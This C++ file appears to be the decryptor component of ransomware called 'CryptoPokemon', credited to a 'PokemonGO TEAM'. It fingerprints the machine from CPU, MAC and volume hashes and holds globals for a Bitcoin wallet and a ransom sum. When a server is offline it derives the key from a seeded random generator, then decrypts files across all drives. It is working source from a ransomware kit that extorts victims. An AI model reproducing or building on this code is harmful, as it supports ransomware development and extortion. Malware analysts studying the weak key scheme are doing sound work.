/*
 * DeCryptor.cpp
 * The main decryptor file.
 *
 * COPYRIGHT (C) 2019 PokemonGO TEAM
 * pokemongo.icu
 */

#include "Windows.h"
#include <iostream>
#include "Lib/ManchineID.h"
#include "Cryptor/Cryptor.h"
#include "Lib/FileMan.h"
#include <shlobj.h>
#include "Lib/TextUtils.h"
#include "Lib/prog_defines.h"

String __PCID;

String __EncryptKey;

String __BTCWallet;

String __BTCSUMM;

queue<String> queueFileNames;


/** Generate random key if crypto-server offline */
void gen_random_key() {
	__EncryptKey = L"";
	srand(_wtoi(__PCID.c_str()));
	String randomString = L"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	for (int i = 0; i < 30; ++i) {
		__EncryptKey += randomString.c_str()[rand() % (randomString.size())];
	}
}

//DecryptWorkerRun
void WorkerRunning()
{
	while (true) // Worker running
	{
		String FilePath = queueFileNames.pop();
		if (FilePath == L"EXIT")
		{
			return;
		}
		std::wcout << L"Decrypt file: " << FilePath << std::endl;
		Cryptor::crypt_func(FilePath, FilePath.substr(0, FilePath.size() - String(CRYPT_lEXT).size()) , MODE_DECRYPT);
	}
}

int main() noexcept
{
	SetConsoleTitle(L"DECRYPTOR FOR *.CRYPTOPOKEMON");

	/** Get hardware threads */
	const auto concurent_threads_supported = std::thread::hardware_concurrency();
	/** Workers collection */
	std::vector<std::thread> MyWorkers;

	//Add workers to thread
	for (unsigned i = 0; i < concurent_threads_supported; i++)
	{
		MyWorkers.emplace_back(WorkerRunning);
	}

	SHORT mac1, mac2;
	ManchineID::get_mac_hash(mac1, mac2);

	__PCID =
		std::to_wstring(ManchineID::get_cpu_hash()) +
		std::to_wstring(mac1) +
		std::to_wstring(mac2) +
		std::to_wstring(ManchineID::get_volume_hash()) +
		ManchineID::get_machine_name();

	const std::hash<String> hasher;

	__PCID = std::to_wstring(hasher(__PCID));

	__EncryptKey = TextUtils::get_wc("DECRYPTKEY12345678901234567890");
	if(__EncryptKey == L"DECRYPTKEY12345678901234567890")
	{
		gen_random_key();
		std::wcout << "Random key: " << __EncryptKey << std::endl << std::endl << std::endl;
		__EncryptKey = L"";
	}

	while(__EncryptKey.size() != 30)
	{
		std::wcout << "Enter decrypt key: ";
		std::wcin >> __EncryptKey;
		if(__EncryptKey.size() != 30)
		{
			std::wcout << L"DECRYPT KEY HAS 30 SYMBOLS!!! PLEASE ENTER VALID DECRYPT KEY!!!" << std::endl;
		}
	}

	FileManager flm;

	flm.is_decrypt = true;

	for (const auto& drive_letter : FileManager::show_drive_letters())
	{
		flm.recursive_search(drive_letter);
		flm.BlackPatches.push_back(drive_letter);
	}

	for (auto& thread : MyWorkers) queueFileNames.push(L"EXIT");
	for (auto& thread : MyWorkers) thread.join();
	system("pause");
	return 0;
}
